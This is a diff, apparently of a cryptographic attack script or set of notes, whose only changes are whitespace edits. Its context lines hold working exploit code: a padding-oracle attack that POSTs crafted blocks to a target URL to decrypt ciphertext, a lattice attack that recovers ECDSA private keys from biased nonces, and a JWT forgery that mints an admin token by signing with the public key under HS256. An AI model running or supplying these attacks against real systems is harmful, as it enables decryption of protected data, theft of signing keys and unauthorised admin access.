@@ -192,34 +192,34 @@ def padding_oracle_attack(url, ciphertext: bytes, block_size=16):
     """Decrypt ciphertext byte-by-byte using padding oracle"""
     blocks = [ciphertext[i:i+block_size] for i in range(0, len(ciphertext), block_size)]
     plaintext = b''
-
+    
     for block_idx in range(len(blocks)-1, 0, -1):
         target_block = blocks[block_idx]
         prev_block = bytearray(blocks[block_idx - 1])
         intermediate = bytearray(block_size)
         decrypted_block = bytearray(block_size)
-
+        
         for byte_pos in range(block_size - 1, -1, -1):
             padding_val = block_size - byte_pos
-
+            
             # Set already-found bytes for correct padding
             test_block = bytearray(block_size)
             for k in range(byte_pos + 1, block_size):
                 test_block[k] = intermediate[k] ^ padding_val
-
+            
             # Brute force current byte
             for guess in range(256):
                 test_block[byte_pos] = guess
                 payload = bytes(test_block) + bytes(target_block)
-
+                
                 resp = requests.post(url, data=payload)
                 if resp.status_code != 400:  # Valid padding
                     intermediate[byte_pos] = guess ^ padding_val
                     decrypted_block[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                     break
-
+        
         plaintext = bytes(decrypted_block) + plaintext
-
+    
     return plaintext
 
 # Attack complexity: 256 * block_size * num_blocks requests
@@ -259,13 +259,13 @@ def lattice_ecdsa_attack(signatures, public_key, n, bias_bits=8):
     signatures: list of (r, s, hash) tuples
     """
     num_sigs = len(signatures)
-
+    
     # Build lattice:
     # For each sig: s_i * k_i = hash_i + r_i * d (mod n)
     # k_i has top `bias_bits` bits as 0: k_i < n / 2^bias_bits
-
+    
     B = Matrix(QQ, num_sigs + 2, num_sigs + 2)
-
+    
     for i in range(num_sigs):
         r_i, s_i, h_i = signatures[i]
         t_i = (inverse_mod(s_i, n) * r_i) % n
@@ -273,10 +273,10 @@ def lattice_ecdsa_attack(signatures, public_key, n, bias_bits=8):
         B[i, i] = n
         B[num_sigs, i] = t_i
         B[num_sigs + 1, i] = u_i
-
+    
     B[num_sigs, num_sigs] = 1
     B[num_sigs + 1, num_sigs + 1] = n // (2 ** bias_bits)
-
+    
     # LLL reduction
     reduced = B.LLL()
     # Private key is in reduced basis
@@ -412,7 +412,7 @@ import jwt, json, base64
 # Server expects RS256 (asymmetric) but accepts HS256 (symmetric)
 # Sign with the PUBLIC key as HMAC secret → valid signature
 public_key = open('public.pem', 'r').read()
-forged = jwt.encode({"sub": "admin", "role": "admin"},
+forged = jwt.encode({"sub": "admin", "role": "admin"}, 
     public_key, algorithm="HS256")
 
 # None algorithm
